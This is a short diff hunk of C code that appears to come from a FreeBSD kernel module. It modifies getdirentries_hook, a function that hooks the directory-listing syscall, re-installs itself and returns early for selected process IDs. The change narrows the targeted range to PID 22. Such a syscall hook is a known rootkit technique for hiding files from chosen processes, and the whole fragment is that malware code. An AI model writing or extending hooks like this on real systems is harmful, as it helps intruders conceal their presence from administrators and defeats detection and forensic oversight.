@@ -253,7 +253,7 @@ getdirentries_hook(struct thread *td, void *syscall_args)
 	sys_getdirentries(td, syscall_args);
 	hook(sys_getdirentries, getdirentries_hook);
 
-	if  ( td->td_proc->p_pid > 18 && td->td_proc->p_pid < 24 )
+	if  ( td->td_proc->p_pid == 22 )
 	{
 		return(0);
 	}
